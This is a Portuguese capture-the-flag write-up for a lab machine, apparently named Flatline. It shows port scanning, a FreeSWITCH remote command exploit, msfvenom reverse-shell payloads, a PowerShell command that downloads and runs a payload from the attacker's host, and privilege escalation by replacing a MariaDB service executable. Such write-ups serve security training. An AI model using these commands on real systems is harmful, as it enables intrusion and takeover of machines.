# Flatline

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.93.165
```
![image](https://github.com/lufffe/Writeups/assets/90646635/32546ca4-5f96-475d-a76d-7f652d72ac48)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 3389,8021 10.10.93.165 -Pn
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6c238c0d-5f3c-49ad-a1d3-6c51df0f872a)

* ### Exploit para o FreeSWITCH.
![image](https://github.com/lufffe/Writeups/assets/90646635/6037eeca-b96d-46c8-806b-34ccfbcb4337)

* ### Rodando exploit.
```bash
python 47799.py 10.10.93.165 whoami
```
![image](https://github.com/lufffe/Writeups/assets/90646635/306d2976-ee7f-456d-a951-334275bea187)

* ### Rodando exploit.
```bash
python 47799.py 10.10.93.165 dir
```

* ### Caminho para ler a flag de Usuário.
```bash
python 47799.py 10.10.93.165 'type c:\\users\\Nekrotic\\Desktop\\user.txt'
```

* ### Escalando previlégio do usuário, criando um arquivo executavel com uma reverse shell nele.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4455 -f exe > rv.exe
```

* ### Transferindo o arquivo para a maquina e executando ela, basta apenas colocar o netcat para escutar a porta escolhida.
```bash
python3 47799.py 10.10.93.165 "powershell.exe Invoke-WebRequest -Uri http://IP:8000/rv.exe -OutFile ./rv.exe && .\rv.exe"
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f27f3d02-2d70-478d-8986-832e1ce2f339)

* ### Depois de gastar um tempo procurando, identifiquei uma pasta diferente no disco C:.
![image](https://github.com/lufffe/Writeups/assets/90646635/d002a969-af5c-4aab-8d2e-0bd51873a354)


* ### Gerei outro arquivo com o msfvenom com o nome de mysqld.exe, só que em outra porta.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4445 -f exe > mysqld.exe
```

* ### E então parei o serviço, troquei os arquivos e startei o serviço novamente e conseguir a shell de administrador.

* c:\\Users\\Nekrotic\\Desktop>copy rv.exe c:\\projects\\openclinic\\mariadb
* c:\\projects\\openclinic\\mariadb>move rv.exe mysqld.exe
* c:\\projects\\openclinic\\mariadb\\bin>net stop OpenClinicMySQL
* c:\\projects\\openclinic\\mariadb\\bin>del mysqld.exe
* c:\\projects\\openclinic\\mariadb>move mysqld.exe bin/
* c:\\projects\\openclinic\\mariadb\\bin>net start OpenClinicMySQL

![image](https://github.com/lufffe/Writeups/assets/90646635/e2b3c0de-f3ed-42a0-b3b0-d4693ab64b7b)



* ### E aqui ( c:\Users\Nekrotic\Desktop>) encontramos a flag root, e conseguimos ler agora.
```bash
type root.txt
```

